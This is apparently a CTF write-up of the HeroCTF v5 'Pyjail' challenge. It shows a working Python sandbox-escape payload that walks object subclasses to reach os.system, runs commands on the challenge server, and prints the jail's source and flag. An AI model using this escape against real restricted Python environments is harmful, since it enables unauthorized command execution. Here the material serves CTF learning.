# Pyjail

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Find the flag](#find-the-flag)
4. [Conclusion](#conclusion)

## Overview

- 174 solves / 50 points
- Difficulty: Easy
- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

Welcome in jail. If it's not your first time, you should be out quickly. If it is your first rodeo, people have escape before you... I'm sure you'll be fine.  
  
> Deploy on [deploy.heroctf.fr](https://deploy.heroctf.fr/)  
  
Format : **Hero{flag}**  
Author : **Log_s**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513181723.png)

## Find the flag

**In this challenge, we can `nc` to the instance machine:**
```shell
┌[siunam♥earth]-(~/ctf/HeroCTF-v5/Misc/PyJail)-[2023.05.13|18:17:56(HKT)]
└> nc dyn-03.heroctf.fr 10441                   
>> hello
An error occured. But which...
>> 
```

**In here, we can enter some python code:**
```shell
>> print(1+1)
2
```

**However, some characters are not allow:**
```shell
>> _
An error occured. But which...
>> a
An error occured. But which...
```

But we don't know it's a syntax error or a forbidden character...

**After fumbling around, I found [this writeup from CSAW CTF Qualification Round 2020](https://ctftime.org/writeup/23430):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HeroCTF-v5/images/Pasted%20image%2020230513183756.png)

**Payload:**
```python
print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls -lah'))
```

What this payload does is using the string `''` object to find the `os` module, and execute OS command via `os.system()`.

> Note: You can read more about that in my recent writeup in PwnMe Qualifications : “8 bits”'s [Anozer Blog](https://siunam321.github.io/ctf/PwnMe-2023-8-bits/Web/Anozer-Blog/), it's about Class Pollution.

**When we execute that payload:**
```shell
>> print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('ls -lah'))
total 16K
drwxr-xr-x 1 root root 4.0K May 12 10:35 .
drwxr-xr-x 1 root root 4.0K May 13 10:17 ..
-rwsr-xr-x 1 root root  133 May 12 10:17 entry.sh
-rwsr-xr-x 1 root root  845 May 12 10:17 pyjail.py
0
```

It ran our OS command!

**Let's get the flag!**
```shell
>> print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cat pyjail.py'))
#! /usr/bin/python3

# FLAG : Hero{nooooo_y0u_3sc4p3d!!}

def jail():
    user_input = input(">> ")

    filtered = ["eval", "exec"]
    
    valid_input = True
    for f in filtered:
        if f in user_input:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break
    for l in user_input:
        if ord(l) < 23 or ord(l) > 126:
            print("You're trying something fancy aren't u ?")
            valid_input = False
            break
    
    if valid_input:
        try:
            exec(user_input, {'__builtins__':{'print': print, 'globals': globals}}, {})
        except:
            print("An error occured. But which...")

def main():
    try:
        while True:
            jail()
    except KeyboardInterrupt:
        print("Bye")

if __name__ == "__main__":
    main()0
```

- **Flag: `Hero{nooooo_y0u_3sc4p3d!!}`**

## Conclusion

What we've learned:

1. Python Jail Escape